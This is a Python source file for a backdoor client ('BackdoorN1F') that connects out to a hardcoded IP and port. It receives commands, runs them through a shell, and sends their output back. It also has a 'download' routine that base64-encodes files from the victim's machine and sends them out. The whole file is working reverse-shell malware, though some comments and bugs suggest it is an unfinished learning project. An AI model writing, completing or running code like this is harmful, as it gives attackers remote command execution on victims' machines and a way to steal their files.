#!/usr/bin/python3

#########################################################################################
#   Client ... or something like that   
#########################################################################################

import socket
import subprocess
import json
import os
import base64

S_IP = "192.168.0.13"
S_PORT = 9091

class BackdoorN1F:
    def __init__(self, ip, port):
        self.connectto = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connectto.connect((ip, port))

#   #####################################################################################
#   Need to make it work ...
    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connectto.sendall(bytes(json_data, encoding="utf-8"))

    def reliable_recv(self):
        json_data = self.connectto.recv(8000)
        return json.loads(json_data)

#   #####################################################################################

    def change_dir(self,path):
        os.chdir(path)
        return f"[+] Changing directory to\t{path}"

    def execute_sys_command(self,command):
        return subprocess.check_output(command, shell=True)

    def read_file(self,file_path):
        with open(file_path, "rb") as file:
            return  base64.b64encode(file.read())

    def run_backdoor(self):
        while True:
            command = self.reliable_recv()
            if command[0] == "qq":
                self.connectto.close()
                exit()
            if command[0] == "cd" and len(command) > 1:
                command_result = self.change_dir(command[1]).encode("utf-8")
            if command[0] == "download":
                command_result = self.read_file(command[1])
            else:
                command_result = self.execute_sys_command(command)
            self.reliable_send(command_result.decode("utf-8"))

if __name__ == "__main__":
    b = BackdoorN1F(S_IP, S_PORT)
    b.run_backdoor()